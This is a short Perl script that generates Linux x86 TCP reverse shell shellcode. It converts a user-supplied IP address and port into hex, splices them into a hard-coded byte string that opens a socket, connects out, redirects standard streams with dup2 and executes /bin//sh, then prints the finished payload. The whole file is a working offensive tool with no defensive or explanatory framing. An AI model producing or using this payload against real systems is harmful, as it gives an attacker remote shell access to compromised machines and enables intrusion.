use strict;
use warnings;

my $port = $ARGV[0];
my $ip = $ARGV[1];

if ($port > 65535) {
	print "Port Greater Than 65535.  Port Range: 1 - 65535 \n";
	exit;
}
if ($port < 1) {
	print "Port Less Than 1.  Port Range: 1 - 65535 \n";
	exit;
}
if (length($port) < 4) {
	print "Ports Only Above 1000 - Requires Root to Bind\n";
	exit;
}

my $hexip = unpack 'H*', pack 'C*', split '\.', $ip;

my $hexport =  sprintf("%04X", $port);

print "\n________________________________________________________________________________________________________________________\n";
print "\nPort Number $port in Hex: 		$hexport\n";
print "\nIP Address $ip in Hex: 		$hexip\n";

my $first_set = substr( $hexport, 2, 4 );
my $second_set = substr( $hexport, 0, 2);

my $one = substr( $hexip, 6, 2 );
my $two = substr( $hexip, 4, 2);
my $three = substr( $hexip, 2, 2);
my $four = substr( $hexip, 0, 2);

my $shellcode_port =  '\x' . "$first_set" . '\x' . "$second_set";

print "\nPort Number to ShellCode Format: 	$shellcode_port\n";

my $shellcode_ip =  '\x' . "$four" . '\x' . "$three" . '\x' . "$two" . '\x' . "$one";

print "\nIP Address to ShellCode Format: 	$shellcode_ip\n";
print "________________________________________________________________________________________________________________________\n";


print "\n\nTCP Reverse Shellcode\n";
my $sc = '\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\x5b\xb0\x66\x68' . $shellcode_ip . '\x66\x68' . $shellcode_port . '\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80';

print "\n$sc\n\n\n"; 

exit(1);
